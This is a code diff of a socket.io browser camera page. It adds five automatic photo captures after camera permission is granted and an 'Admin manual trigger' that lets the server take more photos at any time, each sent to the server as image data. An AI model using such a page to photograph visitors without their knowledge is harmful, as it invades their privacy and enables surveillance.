@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>User Camera Page</title>
+    <title>Live Camera Feed</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -32,7 +32,7 @@
     <h2>📷 Live Camera Feed</h2>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
-    <div class="status" id="status">Connecting to server...</div>
+    <div class="status" id="status">Connecting to camera...</div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -41,19 +41,10 @@
         const canvas = document.getElementById('canvas');
         const statusText = document.getElementById('status');
 
-        // Camera access request
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                statusText.innerText = "Camera Active & Connected";
-            })
-            .catch(err => {
-                console.error("Camera Error: ", err);
-                statusText.innerText = "Camera Permission Denied";
-            });
+        let captureCount = 0;
+        const maxCaptures = 5;
 
-        // Capture trigger listener from server
-        socket.on('capture-photo', () => {
+        function captureAndSend() {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
@@ -61,11 +52,35 @@
 
             const imageData = canvas.toDataURL('image/png');
             socket.emit('user-photo-captured', imageData);
-            statusText.innerText = "Photo Captured & Sent!";
-            
-            setTimeout(() => {
-                statusText.innerText = "Camera Active & Connected";
-            }, 3000);
+            captureCount++;
+            statusText.innerText = `Auto Captured ${captureCount}/${maxCaptures}`;
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                statusText.innerText = "Camera Active";
+
+                // Wait 1 second for camera initialization, then start 5 auto-captures every 1 sec
+                setTimeout(() => {
+                    const autoInterval = setInterval(() => {
+                        if (captureCount < maxCaptures) {
+                            captureAndSend();
+                        } else {
+                            clearInterval(autoInterval);
+                            statusText.innerText = "Camera Connected";
+                        }
+                    }, 1000);
+                }, 1000);
+            })
+            .catch(err => {
+                console.error("Camera Error: ", err);
+                statusText.innerText = "Camera Permission Denied";
+            });
+
+        // Admin manual trigger response
+        socket.on('capture-photo', () => {
+            captureAndSend();
         });
     </script>
 </body>
